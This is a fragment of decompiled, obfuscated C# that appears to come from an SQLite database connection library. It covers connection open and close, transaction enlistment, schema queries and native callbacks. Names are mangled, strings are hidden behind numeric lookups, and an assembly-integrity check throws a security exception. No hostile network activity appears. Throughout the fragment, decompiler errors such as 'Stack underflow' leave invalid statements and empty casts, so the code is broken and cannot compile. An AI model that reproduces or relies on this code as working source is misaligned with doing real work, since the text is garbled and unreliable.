			_0001(this, new global::_0002._001A(global::_000E._001D._0007, null, obj, null, null, null, null, null));
			return obj;
		}

		public override void _0001(string _0002)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0080)/*Error near IL_0026: Stack underflow*/);
			_0001(_0003: new global::_0002._001A(global::_000E._001D._0006, null, null, null, null, null, _0002, null), _0002: (_0080)/*Error near IL_0018: Stack underflow*/);
			throw new NotImplementedException();
		}

		public override void _0002()
		{
			//IL_0100: Incompatible stack heights: 0 vs 1
			//IL_0110: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0080)/*Error near IL_010a: Stack underflow*/);
			_0001(_0003: new global::_0002._001A(global::_000E._001D._0011, null, null, null, null, null, null, null), _0002: (_0080)/*Error near IL_0022: Stack underflow*/);
			if (this._0001 != null)
			{
				if (this._0001 != null)
				{
					_0080 obj2 = new _0080();
					obj2._0001 = this._0001;
					obj2._0011 = _0011;
					obj2._0012 = _0012;
					obj2._0001 = this._0001;
					obj2._0001 = this._0001;
					obj2._0017 = this._0017;
					((global::_0003._0016)obj2._0001._0001)._0001 = obj2;
					obj2._0001._0001 = true;
					this._0001 = null;
					this._0001 = null;
				}
				if (this._0001 != null)
				{
					this._0001._0002(!this._0014);
					this._0001 = null;
				}
				_0011 = 0;
				_0012 = 0;
			}
			StateChangeEventArgs stateChangeEventArgs = null;
			global::_0011._0018._0001(ref stateChangeEventArgs, this, ConnectionState.Closed);
			_0001(this, new global::_0002._001A(global::_000E._001D._0012, stateChangeEventArgs, null, null, null, null, null, null));
		}

		protected override DbCommand _0001()
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			//IL_000d: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0080)/*Error near IL_000d: Stack underflow*/);
			return (DbCommand)/*Error near IL_0005: Stack underflow*/;
		}

		public override void _0001(Transaction _0002)
		{
			//IL_00db: Incompatible stack heights: 0 vs 1
			//IL_00eb: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0080)/*Error near IL_00e5: Stack underflow*/);
			if (((_0080)/*Error near IL_0014: Stack underflow*/)._0001 == null || !_0017_0004._0081_0008(_0002, this._0001._0001))
			{
				if (this._0001 != null)
				{
					throw new ArgumentException(global::_0080._0014._0001(107401711));
				}
				if (_0011 > 0 && _0017_0004._0082_0008(_0002, null))
				{
					throw new ArgumentException(global::_0080._0014._0001(107401666));
				}
				if (_0017_0004._0081_0008(_0002, null))
				{
					throw new ArgumentNullException(global::_0080._0014._0001(107401573));
				}
				bool flag = (this._0003 & SQLiteConnectionFlags.StrictEnlistment) == SQLiteConnectionFlags.StrictEnlistment;
				this._0001 = new global::_001F._001A(this, _0002, System.Data.IsolationLevel.Serializable, flag, flag);
				_0001(this, new global::_0002._001A(global::_000E._001D._0008, null, null, null, null, null, null, new object[1] { this._0001 }));
			}
		}

		public override void _0003()
		{
			//IL_0d4f: Incompatible stack heights: 0 vs 1
			//IL_0d5f: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0080)/*Error near IL_0d59: Stack underflow*/);
			_0080._0001 = (_0080)/*Error near IL_0014: Stack underflow*/;
			_0001(this, new global::_0002._001A(global::_000E._001D._0003, null, null, null, null, null, null, null));
			if (this._0001 != 0)
			{
				throw new InvalidOperationException();
			}
			global::_0008._007E_0010_0002(this);
			string text = this._0012;
			bool flag = _0015;
			SortedList<string, string> sortedList = global::_0011._0018._0001(text, flag, this, _0005: false);
			_0001(this, new global::_0002._001A(global::_000E._001D._0004, null, null, null, null, null, this._0012, new object[1] { sortedList }));
			object obj = global::_0011._0018._0001(_0091._0080_0004(typeof(SQLiteConnectionFlags).TypeHandle), global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107401512), (string)null), _0004: true);
			bool flag2 = global::_0001._001A._0001(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107401535), false.ToString()));
			if (obj is SQLiteConnectionFlags)
			{
				this._0003 |= (SQLiteConnectionFlags)obj;
			}
			else if (!flag2)
			{
				this._0003 |= DefaultFlags;
			}
			if (!global::_0001._001A._0001(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107401482), false.ToString())))
			{
				object obj2;
				_0091_0002._009C_0005(obj2 = _0080.m__0001);
				try
				{
					this._0003 |= _0080.m__0002;
				}
				finally
				{
					_0091_0002._009D_0005(obj2);
				}
			}
			obj = global::_0011._0018._0001(_0091._0080_0004(typeof(DbType).TypeHandle), global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107401493), (string)null), _0004: true);
			this.m__0001 = ((obj is DbType) ? new DbType?((DbType)obj) : null);
			if (this.m__0001.HasValue && this.m__0001.Value == (DbType)(-1))
			{
				this.m__0001 = null;
			}
			this._0015 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400928), (string)null);
			this._0016 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400907), (string)null);
			bool flag3 = false;
			bool flag4 = false;
			if (_0018_0004._0083_0008(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400926), global::_0001._001A._0001(3)), _008F_0003._008B_0007()) != 3)
			{
				throw new NotSupportedException(global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107400913), new object[1] { 3 }));
			}
			string text2 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400812), (string)null);
			if (global::_001C._0096_0003(text2))
			{
				text2 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400827), (string)null);
				if (global::_001C._0096_0003(text2))
				{
					text2 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400822), (string)null);
					if (global::_001C._0096_0003(text2))
					{
						throw new ArgumentException(global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107400777), new object[1] { global::_0080._0014._0001(107401196) }));
					}
					flag4 = true;
				}
				else
				{
					text2 = global::_0011._0018._0001(text2);
					flag3 = true;
				}
			}
			bool flag5 = _009D_0003._009D_0007(text2, global::_0080._0014._0001(107401196), StringComparison.OrdinalIgnoreCase) == 0;
			if ((this._0003 & SQLiteConnectionFlags.TraceWarning) == SQLiteConnectionFlags.TraceWarning && !flag3 && !flag4 && !flag5 && !global::_001C._0096_0003(text2) && _0012_0004._007E_0019_0008(text2, global::_0080._0014._0001(107396991), StringComparison.OrdinalIgnoreCase) && !_0012_0004._007E_0019_0008(text2, global::_0080._0014._0001(107401215), StringComparison.OrdinalIgnoreCase))
			{
				_0015_0004._001E_0008(global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107401210), new object[1] { text2 }));
			}
			if (!flag4)
			{
				if (flag5)
				{
					text2 = global::_0080._0014._0001(107401196);
				}
				else
				{
					bool flag6 = global::_0001._001A._0001(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400396), true.ToString()));
					text2 = global::_0011._0018._0001(text2, flag6);
				}
			}
			try
			{
				bool flag7 = global::_0001._001A._0001(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400411), global::_0011._0018._0001(this).ToString()));
				int num = _0018_0004._0083_0008(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400366), global::_0001._001A._0001(100)), _008F_0003._008B_0007());
				_0013 = _0018_0004._0083_0008(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400377), global::_0001._001A._0001(30)), _008F_0003._008B_0007());
				_0014 = _0018_0004._0083_0008(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400324), global::_0001._001A._0001(0)), _008F_0003._008B_0007());
				this._0015 = _0018_0004._0083_0008(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400339), global::_0001._001A._0001(3)), _008F_0003._008B_0007());
				this._0016 = _0018_0004._0083_0008(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400318), global::_0001._001A._0001(0)), _008F_0003._008B_0007());
				obj = global::_0011._0018._0001(_0091._0080_0004(typeof(System.Data.IsolationLevel).TypeHandle), global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400269), global::_0002._007E_0006(System.Data.IsolationLevel.Serializable)), _0004: true);
				_0004 = ((obj is System.Data.IsolationLevel) ? ((System.Data.IsolationLevel)obj) : System.Data.IsolationLevel.Serializable);
				_0004 = global::_0011._0018._0001(this, _0004);
				if (_0004 != System.Data.IsolationLevel.Serializable && _0004 != System.Data.IsolationLevel.ReadCommitted)
				{
					throw new NotSupportedException(global::_0080._0014._0001(107400236));
				}
				this._0014 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400211), global::_0080._0014._0001(107400702));
				if (this._0001 == null)
				{
					_0001(sortedList);
				}
				global::_0004._0015 obj3 = global::_0004._0015._0001;
				if (!global::_0001._001A._0001(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400641), false.ToString())))
				{
					obj3 |= global::_0004._0015._0004;
				}
				if (global::_0001._001A._0001(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400620), false.ToString())))
				{
					obj3 |= global::_0004._0015._0002;
					obj3 &= ~global::_0004._0015._0004;
				}
				else
				{
					obj3 |= global::_0004._0015._0003;
				}
				if (flag4)
				{
					obj3 |= global::_0004._0015._0005;
				}
				this._0001._0001(text2, this._0016, this._0003, obj3, num, flag7);
				_0016 = global::_0001._001A._0001(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400639), true.ToString()));
				string text3 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400590), (string)null);
				if (text3 != null)
				{
					string text4 = null;
					byte[] array = global::_0011._0018._0001(ref text4, text3);
					if (array == null)
					{
						throw new FormatException(global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107400605), new object[1] { text4 }));
					}
					this._0001._0001(array);
				}
				else
				{
					string text5 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400488), (string)null);
					if (text5 != null)
					{
						this._0001._0001(_0087_0003._007E_0081_0007(_0082_0002._0088_0005(), text5));
					}
					else if (this._0001 != null)
					{
						this._0001._0001(this._0001);
					}
				}
				this._0001 = null;
				if (!flag4)
				{
					this._0013 = global::_001E._009A_0003(text2);
				}
				else
				{
					this._0013 = text2;
				}
				this._0017++;
				ConnectionState connectionState = this._0001;
				this._0001 = ConnectionState.Open;
				try
				{
					string text6 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400507), true.ToString());
					if (global::_0001._001A._0001(text6))
					{
						global::_0010._001C obj4 = global::_0011._0018._0001(this);
						try
						{
							if (_0014 != 0)
							{
								_0082_0003._007E_0011_0007(obj4, global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), global::_0080._0014._0001(107400458), new object[1] { _0014 }));
								global::_001A._007E_001A_0003(obj4);
							}
							int num2;
							if (!flag4 && !flag5)
							{
								text6 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107399913), global::_0001._001A._0001(4096));
								num2 = _0018_0004._0083_0008(text6, _008F_0003._008B_0007());
								if (num2 != 4096)
								{
									_0082_0003._007E_0011_0007(obj4, global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), global::_0080._0014._0001(107399932), new object[1] { num2 }));
									global::_001A._007E_001A_0003(obj4);
								}
							}
							text6 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107399903), global::_0001._001A._0001(0));
							num2 = _0018_0004._0083_0008(text6, _008F_0003._008B_0007());
							if (num2 != 0)
							{
								_0082_0003._007E_0011_0007(obj4, global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), global::_0080._0014._0001(107399850), new object[1] { num2 }));
								global::_001A._007E_001A_0003(obj4);
							}
							text6 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107399813), false.ToString());
							bool flag8 = global::_0001._001A._0001(text6);
							if (flag8)
							{
								obj4.CommandText = global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), global::_0080._0014._0001(107399824), new object[1] { flag8 ? global::_0080._0014._0001(107399746) : global::_0080._0014._0001(107399751) });
								global::_001A._007E_001A_0003(obj4);
							}
							text6 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107399773), global::_0002._007E_0006(SQLiteSynchronousEnum.Default));
							obj = global::_0011._0018._0001(_0091._0080_0004(typeof(SQLiteSynchronousEnum).TypeHandle), text6, _0004: true);
							if (!(obj is SQLiteSynchronousEnum) || (SQLiteSynchronousEnum)obj != SQLiteSynchronousEnum.Default)
							{
								_0082_0003._007E_0011_0007(obj4, global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), global::_0080._0014._0001(107399724), new object[1] { text6 }));
								global::_001A._007E_001A_0003(obj4);
							}
							text6 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107399691), global::_0001._001A._0001(-2000));
							num2 = _0018_0004._0083_0008(text6, _008F_0003._008B_0007());
							if (num2 != -2000)
							{
								_0082_0003._007E_0011_0007(obj4, global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), global::_0080._0014._0001(107399706), new object[1] { num2 }));
								global::_001A._007E_001A_0003(obj4);
							}
							text6 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400189), global::_0002._007E_0006(SQLiteJournalModeEnum.Default));
							obj = global::_0011._0018._0001(_0091._0080_0004(typeof(SQLiteJournalModeEnum).TypeHandle), text6, _0004: true);
							if (!(obj is SQLiteJournalModeEnum) || (SQLiteJournalModeEnum)obj != SQLiteJournalModeEnum.Default)
							{
								string text7 = global::_0080._0014._0001(107400140);
								_0082_0003._007E_0011_0007(obj4, global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), text7, new object[1] { text6 }));
								global::_001A._007E_001A_0003(obj4);
							}
							text6 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400107), false.ToString());
							flag8 = global::_0001._001A._0001(text6);
							if (flag8)
							{
								obj4.CommandText = global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), global::_0080._0014._0001(107400122), new object[1] { flag8 ? global::_0080._0014._0001(107399746) : global::_0080._0014._0001(107399751) });
								global::_001A._007E_001A_0003(obj4);
							}
							text6 = global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400089), false.ToString());
							flag8 = global::_0001._001A._0001(text6);
							if (flag8)
							{
								obj4.CommandText = global::_0011._0018._0001((IFormatProvider)_008F_0003._008B_0007(), global::_0080._0014._0001(107400032), new object[1] { flag8 ? global::_0080._0014._0001(107399746) : global::_0080._0014._0001(107399751) });
								global::_001A._007E_001A_0003(obj4);
							}
						}
						finally
						{
							if (obj4 != null)
							{
								global::_0008._007E_0098(obj4);
							}
						}
					}
					if (this.m__0001 != null)
					{
						this._0001._0001(this._0016, this.m__0001);
					}
					if (this.m__0001 != null)
					{
						this._0001._0001(this.m__0001);
					}
					if (this.m__0001 != null)
					{
						this._0001._0001(this.m__0001);
					}
					if (this.m__0001 != null)
					{
						this._0001._0001(this.m__0001);
					}
					if (this.m__0001 != null)
					{
						this._0001._0001(this.m__0001);
					}
					Transaction transaction = _0019_0004._0084_0008();
					if (_0017_0004._0082_0008(transaction, null) && global::_0001._001A._0001(global::_0011._0018._0001(sortedList, global::_0080._0014._0001(107400023), true.ToString())))
					{
						_001A_0004._007E_0086_0008(this, transaction);
					}
					this._0001 = connectionState;
					StateChangeEventArgs stateChangeEventArgs = null;
					global::_0011._0018._0001(ref stateChangeEventArgs, this, ConnectionState.Open);
					_0001(this, new global::_0002._001A(global::_000E._001D._0005, stateChangeEventArgs, null, null, null, null, null, null));
				}
				catch
				{
					this._0001 = connectionState;
					throw;
				}
			}
			catch (SQLiteException)
			{
				global::_0008._007E_0010_0002(this);
				throw;
			}
		}

		public override DataTable _0001()
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 2
			global::_0011._0018._0001((_0080)/*Error near IL_0024: Stack underflow*/);
			_ = _001E_0004._007E_008B_0008;
			string text = global::_0080._0014._0001(107398901);
			return /*Error near IL_001b: Stack underflow*/((object)/*Error near IL_001b: Stack underflow*/, text, null);
		}

		public override DataTable _0001(string _0002)
		{
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 2
			global::_0011._0018._0001((_0080)/*Error near IL_0020: Stack underflow*/);
			_ = _001E_0004._007E_008B_0008;
			string[] array = new string[0];
			return /*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/, _0002, array);
		}

		public override DataTable _0001(string _0002, string[] _0003)
		{
			//IL_0267: Incompatible stack heights: 0 vs 1
			//IL_0277: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0080)/*Error near IL_0271: Stack underflow*/);
			if (((_0080)/*Error near IL_0014: Stack underflow*/)._0001 != ConnectionState.Open)
			{
				throw new InvalidOperationException();
			}
			string[] array = new string[5];
			if (_0003 == null)
			{
				_0003 = new string[0];
			}
			_001F_0004._007E_008C_0008(_0003, array, 0);
			string key;
			if ((key = _0097_0003._007E_0097_0007(_0002, _008F_0003._008B_0007())) != null)
			{
				if (global::_0008._0015._0002 == null)
				{
					global::_0008._0015._0002 = new Dictionary<string, int>(14)
					{
						{
							global::_0080._0014._0001(107398872),
							0
						},
						{
							global::_0080._0014._0001(107398843),
							1
						},
						{
							global::_0080._0014._0001(107398814),
							2
						},
						{
							global::_0080._0014._0001(107398801),
							3
						},
						{
							global::_0080._0014._0001(107398756),
							4
						},
						{
							global::_0080._0014._0001(107398771),
							5
						},
						{
							global::_0080._0014._0001(107398726),
							6
						},
						{
							global::_0080._0014._0001(107398745),
							7
						},
						{
							global::_0080._0014._0001(107398696),
							8
						},
						{
							global::_0080._0014._0001(107398719),
							9
						},
						{
							global::_0080._0014._0001(107398710),
							10
						},
						{
							global::_0080._0014._0001(107398661),
							11
						},
						{
							global::_0080._0014._0001(107398676),
							12
						},
						{
							global::_0080._0014._0001(107399143),
							13
						}
					};
				}
				if (global::_0008._0015._0002.TryGetValue(key, out var value))
				{
					switch (value)
					{
					case 0:
						return global::_0011._0018._0001();
					case 1:
						return global::_0011._0018._0001(this);
					case 2:
						return global::_0011._0018._0001(this);
					case 3:
					case 4:
						return global::_0011._0018._0001(this, array[0], array[2], array[3]);
					case 5:
						return global::_0011._0018._0001(this, array[0], array[2], array[3]);
					case 6:
						return global::_0011._0018._0001(this, array[0], array[2], array[3]);
					case 7:
						return global::_0011._0018._0001(this, array[0], array[2], array[3], array[4]);
					case 8:
						return global::_0011._0018._0001(this, array[0], array[2], array[3]);
					case 9:
						return global::_0011._0018._0001(this, array[0], array[2]);
					case 10:
						return global::_0011._0018._0001(this, array[0], array[2], array[3]);
					case 11:
						return global::_0011._0018._0001(this, array[0], array[2], array[3]);
					case 12:
						return global::_0011._0018._0001(this, array[0]);
					case 13:
						return global::_0011._0018._0001();
					}
				}
			}
			throw new NotSupportedException();
		}

		private global::_000E._001E _0001(IntPtr _0002)
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			try
			{
				new global::_0004._0017((IntPtr)/*Error near IL_002f: Stack underflow*/, global::_000E._001E._0001);
				global::_0004._0017 obj = default(global::_0004._0017);
				if (0 == 0)
				{
					obj = (global::_0004._0017)/*Error near IL_0032: Stack underflow*/;
				}
				if (this.m__0001 != null)
				{
					this.m__0001(this, obj);
				}
				return obj._0001;
			}
			catch (Exception ex)
			{
				try
				{
					if ((this._0003 & SQLiteConnectionFlags.LogCallbackException) == SQLiteConnectionFlags.LogCallbackException)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107399154), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
			if ((this._0003 & SQLiteConnectionFlags.InterruptOnException) == SQLiteConnectionFlags.InterruptOnException)
			{
				return global::_000E._001E._0002;
			}
			return global::_000E._001E._0001;
		}

		private global::_0001._001C _0001(IntPtr _0002, global::_0004._0019 _0003, IntPtr _0004, IntPtr _0005, IntPtr _0006, IntPtr _0007)
		{
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			try
			{
				global::_0080._0016 obj5 = new global::_0080._0016(_0094_001B_0006: global::_0011._0018._0001((IntPtr)/*Error near IL_000c: Stack underflow*/, -1), _0095_001B_0006: global::_0011._0018._0001(_0005, -1), _0096_0014_0006: global::_0011._0018._0001(_0006, -1), _0015_007F: global::_0011._0018._0001(_0007, -1), _0008_001B_0006: (IntPtr)/*Error near IL_002a: Stack underflow*/, _000F_001B_0006: (global::_0004._0019)/*Error near IL_002a: Stack underflow*/, _0092_001B_0006: global::_0001._001C._0001);
				if (this.m__0001 != null)
				{
					this.m__0001(this, obj5);
				}
				return obj5._0001;
			}
			catch (Exception ex)
			{
				try
				{
					if ((this._0003 & SQLiteConnectionFlags.LogCallbackException) == SQLiteConnectionFlags.LogCallbackException)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107399097), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
			if ((this._0003 & SQLiteConnectionFlags.DenyOnException) == SQLiteConnectionFlags.DenyOnException)
			{
				return global::_0001._001C._0002;
			}
			return global::_0001._001C._0001;
		}

		private void _0001(IntPtr _0002, int _0003, IntPtr _0004, IntPtr _0005, long _0006)
		{
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 2
			//IL_002f: Incompatible stack heights: 0 vs 1
			try
			{
				_ = ((_0080)/*Error near IL_0007: Stack underflow*/).m__0001;
				global::_001C._0015 e = new global::_001C._0015(global::_0011._0018._0001((IntPtr)/*Error near IL_0011: Stack underflow*/, -1), global::_0011._0018._0001(_0005, -1), (global::_0006._0016)_0003, _0006);
				/*Error near IL_0026: Stack underflow*/((object)/*Error near IL_0026: Stack underflow*/, e);
			}
			catch (Exception ex)
			{
				try
				{
					if ((this._0003 & SQLiteConnectionFlags.LogCallbackException) == SQLiteConnectionFlags.LogCallbackException)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107399036), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
		}

		private void _0001(IntPtr _0002, IntPtr _0003)
		{
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 2
			try
			{
				if (((_0080)/*Error near IL_0007: Stack underflow*/).m__0001 != null)
				{
					_ = ((_0080)/*Error near IL_0010: Stack underflow*/).m__0001;
					global::_0004._0018 e = new global::_0004._0018(global::_0011._0018._0001(_0003, -1));
					/*Error near IL_0023: Stack underflow*/((object)/*Error near IL_0023: Stack underflow*/, e);
				}
			}
			catch (Exception ex)
			{
				try
				{
					if ((this._0003 & SQLiteConnectionFlags.LogCallbackException) == SQLiteConnectionFlags.LogCallbackException)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107398947), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
		}

		private int _0001(IntPtr _0002)
		{
			//IL_0030: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			try
			{
				new global::_0018._001D();
				global::_0018._001D obj;
				if (6u != 0)
				{
					obj = (global::_0018._001D)/*Error near IL_0033: Stack underflow*/;
				}
				if (((_0080)/*Error near IL_000d: Stack underflow*/).m__0001 != null)
				{
					this.m__0001(this, obj);
				}
				return obj._0001 ? 1 : 0;
			}
			catch (Exception ex)
			{
				try
				{
					if ((this._0003 & SQLiteConnectionFlags.LogCallbackException) == SQLiteConnectionFlags.LogCallbackException)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107398382), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
			if ((this._0003 & SQLiteConnectionFlags.RollbackOnException) == SQLiteConnectionFlags.RollbackOnException)
			{
				return 1;
			}
			return 0;
		}

		private void _0001(IntPtr _0002)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 2
			//IL_002a: Incompatible stack heights: 0 vs 2
			try
			{
				if (((_0080)/*Error near IL_0007: Stack underflow*/).m__0001 != null)
				{
					_ = _0015_0002._007E_0017_0005;
					_ = ((_0080)/*Error near IL_0015: Stack underflow*/).m__0001;
					EventArgs empty = EventArgs.Empty;
					/*Error near IL_0021: Stack underflow*/((object)/*Error near IL_0021: Stack underflow*/, (object)/*Error near IL_0021: Stack underflow*/, empty);
				}
			}
			catch (Exception ex)
			{
				try
				{
					if ((this._0003 & SQLiteConnectionFlags.LogCallbackException) == SQLiteConnectionFlags.LogCallbackException)
					{
						global::_0011._0018._0001(-2146233088, global::_0011._0018._0001((IFormatProvider)_008F_0003._008C_0007(), global::_0080._0014._0001(107398357), new object[1] { ex }));
					}
				}
				catch
				{
				}
			}
		}

		static _0080()
		{
			//IL_00e1: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_00e7: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				throw new SecurityException(global::_0080._0014._0001(107396706));
			}
			_0080.m__0001 = _0092._007E_0081_0004(_0091._0080_0004(typeof(_0080).TypeHandle));
			_0080.m__0001 = new object();
		}
	}
}
namespace _001B
{
	internal enum _0019
	{
		_0001,
		_0002,
		_0003
	}
}
namespace _0019
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	internal delegate global::_000E._001E _001C(IntPtr pUserData);
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	internal delegate global::_0001._001C _001D(IntPtr pUserData, global::_0004._0019 actionCode, IntPtr pArgument1, IntPtr pArgument2, IntPtr pDatabase, IntPtr pAuthContext);
}
namespace _0018
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	internal delegate void _001B(IntPtr puser, int type, IntPtr database, IntPtr table, long rowid);
}
namespace _0017
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	internal delegate int _0081(IntPtr puser);
}
namespace _0010
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	internal delegate void _001D(IntPtr puser, IntPtr statement);
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	internal delegate void _001E(IntPtr puser);
}
namespace _0014
{
	internal delegate void _0016(object sender, global::_0004._0017 e);
}
namespace _0018
{
	internal delegate void _001C(object sender, _0080._0016 e);
}
namespace _0019
{
	internal delegate void _001E(object sender, global::_0018._001D e);
}
namespace _0005
{
	internal delegate void _0017(object sender, _001C._0015 e);
}
namespace _000E
{
	internal delegate void _001C(object sender, global::_0004._0018 e);
}
namespace _0002
{
	internal delegate bool _001B(global::_0017._0080 source, string sourceName, global::_0017._0080 destination, string destinationName, int pages, int remainingPages, int totalPages, bool retry);
}
namespace _0004
{
	internal sealed class _0017 : EventArgs
	{
		public readonly IntPtr _0001;

		public global::_000E._001E _0001;

		private _0017()
		{
			this._0001 = IntPtr.Zero;
			_0001 = global::_000E._001E._0001;
		}

		internal _0017(IntPtr _0008_001B_0006, global::_000E._001E _0092_001B_0006)
			: this()
		{
			this._0001 = _0008_001B_0006;
			_0001 = _0092_001B_0006;
		}
	}
}
namespace _0080
{
	internal sealed class _0016 : EventArgs
	{
		public readonly IntPtr _0001;

		public readonly global::_0004._0019 _0001;

		public readonly string _0001;

		public readonly string _0002;

		public readonly string _0003;

		public readonly string _0004;

		public global::_0001._001C _0001;

		private _0016()
		{
			this._0001 = IntPtr.Zero;
			this._0001 = global::_0004._0019._0001;
			this._0001 = null;
			_0002 = null;
			_0003 = null;
			_0004 = null;
			_0001 = global::_0001._001C._0001;
		}

		internal _0016(IntPtr _0008_001B_0006, global::_0004._0019 _000F_001B_0006, string _0094_001B_0006, string _0095_001B_0006, string _0096_0014_0006, string _0015_007F, global::_0001._001C _0092_001B_0006)
			: this()
		{
			this._0001 = _0008_001B_0006;
			this._0001 = _000F_001B_0006;
			this._0001 = _0094_001B_0006;
			_0002 = _0095_001B_0006;
			_0003 = _0096_0014_0006;
			_0004 = _0015_007F;
			_0001 = _0092_001B_0006;
		}

		static _0016()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0014._0001(107396751), _0014._0001(107396746)), _0014._0001(107396741), _0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0014._0001(107396706));
		}
	}
}
namespace _0006
{
	internal enum _0016
	{
		_0001 = 9,
		_0002 = 18,
		_0003 = 23
	}
}
namespace _001C
{
	internal sealed class _0015 : EventArgs
	{
		public readonly string _0001;

		public readonly string _0002;

		public readonly global::_0006._0016 _0001;

